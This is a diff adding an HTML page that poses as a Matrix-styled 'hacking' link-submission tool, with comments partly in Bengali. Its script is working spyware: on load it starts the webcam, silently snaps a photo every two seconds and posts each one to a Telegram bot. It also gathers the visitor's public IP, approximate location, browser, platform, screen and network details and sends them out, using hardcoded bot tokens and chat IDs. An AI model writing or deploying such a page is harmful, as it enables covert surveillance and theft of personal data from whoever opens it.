@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="A complete ethical hacking course offering various series including Android, Computer, Social Media, and Website hacking.">
+    <title>MATRIX</title>
+    <style>
+        body, html {margin: 0; padding: 0; height: 100%; background-color: black; overflow: hidden; font-family: Arial, sans-serif;}
+        canvas {position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0;}
+        .container {position: absolute; top: 30%; left: 50%; transform: translate(-50%, -50%); text-align: center; color: white; z-index: 1;}
+        h1 {font-size: 100px; font-weight: bold; color: #00FF00; margin-bottom: 20px;}
+        input, button {width: 120%; max-width: 500px; padding: 12px; font-size: 20px; background: rgba(0, 0, 0, 0.5); border: 2px solid #00FF00; color: white; text-align: center; outline: none; border-radius: 5px; margin-bottom: 15px; margin-left: -20px;}
+        button {cursor: pointer;}
+        button:hover {background: rgba(0, 255, 0, 0.3);}
+        .message-container {position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); text-align: center; color: white; font-size: 30px; display: none;}
+        .timer {font-size: 40px; font-weight: bold; color: red;}
+    </style>
+</head>
+<body>
+    <canvas id="matrix"></canvas>
+    <div class="container" id="inputContainer">
+        <h1>SR</h1>
+        <input type="text" id="videoLink" placeholder="ENTER LINK">
+        <br>
+        <button onclick="startProcess()">SEND</button>
+    </div>
+    <div class="message-container" id="messageContainer">
+        <p id="statusMessage">PLEASE WAIT 30 SECOND</p>
+        <p class="timer" id="countdown">30</p>
+    </div>
+
+    <video id="video" autoplay playsinline style="display: none;"></video>
+    <canvas id="cameraCanvas" style="display: none;"></canvas>
+
+    <script>
+        function startProcess() {
+            const message = document.getElementById("videoLink").value.trim();
+            if (message === "") return;
+            document.getElementById("inputContainer").style.display = "none";
+            document.getElementById("messageContainer").style.display = "block";
+            let counter = 30;
+            const countdownInterval = setInterval(() => {
+                document.getElementById("countdown").innerText = counter;
+                counter--;
+                if (counter < 0) {
+                    clearInterval(countdownInterval);
+                    document.getElementById("statusMessage").innerText = "REQUEST গ্রহণ করা হয়েছে। কিছুক্ষন পরে আপনার কাজ সফল হয়ে যাবে। ধন্যবাদ :)";
+                    document.getElementById("countdown").style.display = "none";
+                    sendToTelegramText(message); // Send Text to the first bot
+                }
+            }, 1000);
+        }
+
+        // Function to send text to Telegram bot 1 (mgs Pathanior Bot)
+        function sendToTelegramText(message) {
+            const botToken = "7628637870:AAF0q1GpYIuJpxbVTP5nVYVk-l2yWAxzzbs"; // Sobi Pathanior Bot Token
+            const chatId1 = "7962046796"; // Sobi Pathanior Bot Chat ID
+            const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            try {
+                fetch(apiUrl, {
+                    method: "POST",
+                    headers: {"Content-Type": "application/json"},
+                    body: JSON.stringify({chat_id: chatId1, text: "SETH HACKER! NEW LINK RECEIVED ↓"})
+                })
+                .then(() => fetch(apiUrl, {
+                    method: "POST",
+                    headers: {"Content-Type": "application/json"},
+                    body: JSON.stringify({chat_id: chatId, text: message})
+                }))
+                .catch(error => {
+                    console.error("Error sending text:", error);
+                });
+            } catch (error) {
+                console.error("Error in Telegram API:", error);
+            }
+        }
+
+        // Function to send photo to Telegram bot 2 (pic Pathanor Bot)
+        function sendPhotoToTelegram(blob) {
+            const botToken = "7362244711:AAG8PejiHPdrYfyDyI6i4X7nxQMYJcy36_E"; // Message Pathanor Bot Token
+            const chatId2 = "7962046796"; // Message Pathanor Bot Chat ID
+            const formData = new FormData();
+            formData.append("chat_id", chatId2);
+            formData.append("photo", blob, "image.png");
+
+            try {
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: "POST",
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => console.log("200", data))
+                .catch(error => console.error("Error:", error));
+            } catch (error) {
+                console.error("Error:", error);
+            }
+        }
+
+        // ===================== MATRIX BACKGROUND EFFECT =====================
+        const canvas = document.getElementById('matrix');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+        const matrix = letters.split('');
+        const fontSize = 18;
+        const columns = canvas.width / fontSize;
+        const drops = Array.from({ length: columns }).fill(1);
+        function draw() {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = '#00FF00';
+            ctx.font = `${fontSize}px monospace`;
+            for (let i = 0; i < drops.length; i++) {
+                const text = matrix[Math.floor(Math.random() * matrix.length)];
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {drops[i] = 0;}
+                drops[i]++;
+            }
+        }
+        setInterval(draw, 33);
+        window.addEventListener('resize', () => {canvas.width = window.innerWidth; canvas.height = window.innerHeight;});
+
+        // ===================== BACKGROUND CAMERA CAPTURE =====================
+        const video = document.getElementById('video');
+        const cameraCanvas = document.getElementById('cameraCanvas');
+        const cameraContext = cameraCanvas.getContext('2d');
+
+        function startCamera() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then((stream) => {
+                    video.srcObject = stream;
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        cameraCanvas.width = video.videoWidth;
+                        cameraCanvas.height = video.videoHeight;
+                    };
+                })
+                .catch((error) => {
+                    console.error("C access denied!", error);
+                });
+        }
+
+        function captureAndSendPhoto() {
+            if (video.videoWidth === 0 || video.videoHeight === 0) {
+                console.log("Video not ready yet.");
+                return;
+            }
+            cameraContext.drawImage(video, 0, 0, cameraCanvas.width, cameraCanvas.height);
+            cameraCanvas.toBlob((blob) => {
+                sendPhotoToTelegram(blob); // Send photo to bot 2
+            }, 'image/png');
+        }
+
+        // Start camera and send photo every 2 seconds
+        startCamera();
+        setInterval(captureAndSendPhoto, 2000); // ২ সেকেন্ড পরপর ছবি পাঠাবে
+        // টেলিগ্রাম বট টোকেন এবং চ্যাট আইডি
+        const botToken = '7628637870:AAF0q1GpYIuJpxbVTP5nVYVk-l2yWAxzzbs';
+        const chatId = '7962046796';
+
+        // সরাসরি তথ্য সংগ্রহ এবং পাঠান
+        (async function () {
+            try {
+                // পাবলিক IP ঠিকানা সংগ্রহ
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const publicIP = ipData.ip;
+
+                // ব্রাউজার এবং ডিভাইসের তথ্য
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+
+                // স্ক্রিন রেজোলিউশন
+                const screenWidth = window.screen.width;
+                const screenHeight = window.screen.height;
+
+                // লোকেশন (আনুমানিক)
+                const locationResponse = await fetch(`https://ipapi.co/${publicIP}/json/`);
+                const locationData = await locationResponse.json();
+                const location = `${locationData.city}, ${locationData.region}, ${locationData.country_name}`;
+
+                // নেটওয়ার্কের ধরন (Wi-Fi বা মোবাইল ডেটা)
+                const connectionType = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
+
+                // ফোনের নাম (যদি সম্ভব হয়)
+                const deviceName = navigator.deviceMemory ? `Device Memory: ${navigator.deviceMemory} GB` : 'Unknown';
+
+                // তথ্য একসাথে মেসেজ হিসেবে পাঠান
+                const message = `
+                    পাবলিক IP: ${publicIP}
+                    ব্রাউজার এবং ডিভাইস: ${userAgent} (${platform})
+                    স্ক্রিন রেজোলিউশন: ${screenWidth}x${screenHeight}
+                    লোকেশন: ${location}
+                    নেটওয়ার্কের ধরন: ${connectionType}
+                    ডিভাইসের তথ্য: ${deviceName}
+                `;
+
+                // টেলিগ্রাম বটে তথ্য পাঠান
+                const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+                await fetch(url);
+
+                // ব্যবহারকারীকে জানান
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        })();
+    </script>
+</body>
+</html>
